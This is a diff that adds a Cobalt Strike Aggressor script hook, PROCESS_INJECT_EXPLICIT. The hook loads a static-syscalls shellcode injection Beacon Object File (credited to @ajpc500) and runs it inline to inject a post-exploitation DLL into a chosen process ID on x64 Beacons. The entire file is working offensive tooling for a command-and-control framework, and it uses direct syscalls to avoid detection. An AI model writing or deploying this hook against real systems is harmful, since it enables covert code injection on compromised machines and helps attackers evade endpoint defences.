@@ -1,0 +1,39 @@
+# Hook to allow the user to define how the explicit injection technique 
+# is implemented when executing post exploitation commands. 
+# $1 = Beacon ID 
+# $2 = memory injectable dll for the post exploitation command 
+# $3 = the PID to inject into 
+# $4 = offset to jump to 
+# $5 = x86/x64 - memory injectable DLL arch 
+set PROCESS_INJECT_EXPLICIT { 
+local('$barch $handle $data $args'); 
+ 
+# Set the architecture for the beacon's session 
+$barch = barch($1); 
+ 
+if ($barch eq "x86") { 
+    warn("Static Syscalls Shellcode Injection BOF (@ajpc500) does not support x86. Use built in default"); 
+    return $null; 
+} 
+ 
+if ($4 > 0) { 
+    warn("Static Syscalls Shellcode Injection BOF (@ajpc500) does not support offset argument. Use built in default"); 
+    return $null; 
+} 
+ 
+# read in the injection BOF based on barch 
+warn("read the BOF: syscallsinject. $+ $barch $+ .o"); 
+$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o")); 
+$data = readb($handle, -1); 
+closef($handle); 
+ 
+# pack our arguments needed for the BOF 
+$args = bof_pack($1, "ib", $3, $2); 
+ 
+btask($1, "Static Syscalls Shellcode Injection BOF (@ajpc500) into pid $3"); 
+ 
+beacon_inline_execute($1, $data, "go", $args); 
+ 
+# Let the caller know the hook was implemented. 
+return 1; 
+} 
